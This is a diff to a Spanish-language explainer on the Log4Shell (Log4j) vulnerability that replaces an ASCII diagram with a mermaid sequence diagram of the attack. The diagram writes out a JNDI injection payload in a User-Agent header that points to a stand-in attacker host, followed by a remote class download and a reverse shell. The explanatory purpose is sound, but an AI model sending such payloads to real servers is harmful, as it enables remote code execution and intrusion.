@@ -28,16 +28,22 @@ Cuando Log4j procesaba un mensaje que contenía esta cadena (por ejemplo, en la 
 
 ## Flujo del ataque
 
-```text
-[Atacante] --( Petición HTTP con payload ${jndi:...} )--> [Servidor Vulnerable (Log4j)]
-                                                                    |
-                                                            (Consulta LDAP JNDI)
-                                                                    v
-[Servidor LDAP Malicioso] <-----------------------------------------+
-       |
-  (Envía clase Java maliciosa)
-       v
-[Servidor Vulnerable] ===> ¡Ejecución remota de código en contexto de aplicación!
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as 🦹 Atacante
+    participant App as 🖥️ Servidor vulnerable (Log4j 2)
+    participant LDAP as 💀 Servidor LDAP malicioso
+    participant Web as 🌐 Servidor HTTP de payload
+
+    Attacker->>App: 1. Envía petición HTTP con User-Agent: ${jndi:ldap://atacante.com/Exploit}
+    Note over App: Log4j evalúa ${jndi:...} y ejecuta consulta JNDI
+    App->>LDAP: 2. Consulta LDAP hacia servidor del atacante
+    LDAP-->>App: 3. Devuelve referencia a clase remota (http://atacante.com/Exploit.class)
+    App->>Web: 4. Descarga clase Java compilada maliciosa
+    Web-->>App: 5. Entrega Exploit.class
+    Note over App: Carga y ejecuta el código estático de la clase
+    App-->>Attacker: 6. Shell reversa establecida (RCE en servidor)
 ```
 
 ---
